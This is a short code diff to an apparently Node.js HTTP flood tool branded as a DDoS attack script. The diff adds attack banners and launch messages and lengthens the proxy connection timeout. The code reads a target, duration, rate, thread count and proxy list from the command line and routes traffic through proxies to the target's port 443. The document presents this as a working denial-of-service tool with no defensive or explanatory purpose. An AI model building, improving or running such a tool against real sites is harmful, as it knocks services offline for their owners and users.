@@ -215,7 +215,8 @@ const secureOptions =
 const RESTART_DELAY = 1000;
 
 if (cluster.isMaster) {
-	console.log("ATTACK SENT !".yellow.bold);
+    console.log("═════════════════════════════════════════════════════════════".gray);
+    console.log(` HANZGRADIAN DDOS ATTACK`.red.bold);
     console.log("═════════════════════════════════════════════════════════════".gray);
     console.log(` >> Target       : `.brightYellow + process.argv[2]);
     console.log(` >> Duration     : `.brightYellow + process.argv[3] + " seconds");
@@ -223,6 +224,10 @@ if (cluster.isMaster) {
     console.log(` >> Threads      : `.brightYellow + process.argv[5]);
     console.log(` >> Proxy File   : `.brightYellow + process.argv[6]);
     console.log("═════════════════════════════════════════════════════════════".gray);
+    console.log(` [!] Attack launched successfully`.brightRed);
+    console.log("═════════════════════════════════════════════════════════════".gray);
+    console.log("HANZGRADIAN DDOS | HIGH RQ/S GLORY CUSTOM".yellow.bold);
+    
     const restartScript = () => {
         for (const id in cluster.workers) {
             cluster.workers[id].kill();
@@ -522,7 +527,7 @@ let headers = {
      host: parsedProxy[0],
      port: ~~parsedProxy[1],
      address: parsedTarget.host + ":443",
-     timeout: 5
+     timeout: 10
  };
  Socker.HTTP(proxyOptions, (connection, error) => {
     if (error) return
